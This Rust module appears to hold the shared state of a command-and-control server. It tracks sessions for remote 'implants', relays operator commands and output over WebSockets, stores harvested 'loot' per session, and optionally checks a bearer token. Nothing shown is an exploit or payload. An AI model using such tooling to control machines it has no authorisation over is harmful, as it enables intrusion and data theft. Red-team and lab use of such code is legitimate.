use std::collections::HashMap;
use std::path::PathBuf;
use std::sync::Arc;
use std::time::{SystemTime, UNIX_EPOCH};

use axum::extract::ws::Message;
use serde::Serialize;
use tokio::sync::{broadcast, mpsc, RwLock};

/// Anything that travels either direction over a WebSocket.
#[derive(Clone, Debug)]
pub enum Wire {
    Text(String),
    Binary(Vec<u8>),
}

impl Wire {
    pub fn to_message(&self) -> Message {
        match self {
            Wire::Text(s) => Message::Text(s.clone()),
            Wire::Binary(b) => Message::Binary(b.clone()),
        }
    }
}

/// What the operator UI (and `/api/sessions`) sees.
#[derive(Clone, Debug, Serialize)]
pub struct SessionInfo {
    pub id: String,
    pub host: String,
    pub user: String,
    pub os: String,
    pub arch: String,
    pub admin: bool,
    pub screen: [u32; 2],
    pub last_seen: u64,
    pub online: bool,
}

pub struct Session {
    /// Server -> implant.
    pub to_implant: mpsc::Sender<Wire>,
    /// Implant -> operator(s). Every attached op socket subscribes.
    pub from_implant: broadcast::Sender<Wire>,
    pub info: SessionInfo,
}

pub type Sessions = Arc<RwLock<HashMap<String, Session>>>;

#[derive(Clone)]
pub struct AppState {
    pub sessions: Sessions,
    /// None = lab mode, no auth. Set from env `C2_TOKEN`.
    pub token: Option<String>,
    /// Root directory for harvested loot, one subdir per session.
    pub loot_dir: PathBuf,
}

pub fn now() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

impl AppState {
    /// `?token=` query param or `Authorization: Bearer <token>` header.
    pub fn authorized(
        &self,
        headers: &axum::http::HeaderMap,
        q: &HashMap<String, String>,
    ) -> bool {
        match &self.token {
            None => true,
            Some(want) => {
                if q.get("token").is_some_and(|got| got == want) {
                    return true;
                }
                if let Some(h) = headers.get("authorization").and_then(|v| v.to_str().ok()) {
                    return h.strip_prefix("Bearer ").is_some_and(|got| got == want);
                }
                false
            }
        }
    }
}
